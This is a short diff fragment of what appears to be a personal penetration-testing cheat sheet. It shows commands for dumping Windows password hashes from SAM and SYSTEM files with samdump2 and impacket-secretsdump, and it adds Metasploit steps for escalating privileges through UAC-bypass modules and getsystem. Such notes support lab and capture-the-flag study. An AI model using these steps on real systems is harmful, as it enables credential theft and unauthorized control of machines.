@@ -25,3 +25,9 @@ Windows Vista ou menor: samdump2
 
 # --==-- #
 impacket-secretsdump -sam [FILE] -system [FILE] LOCAL
+
+
+GET PRIVILEGES on MSF:
+1) background
+2) search uac # Ex: /local/ask | bypassuac_fodhelper
+3) getsystem
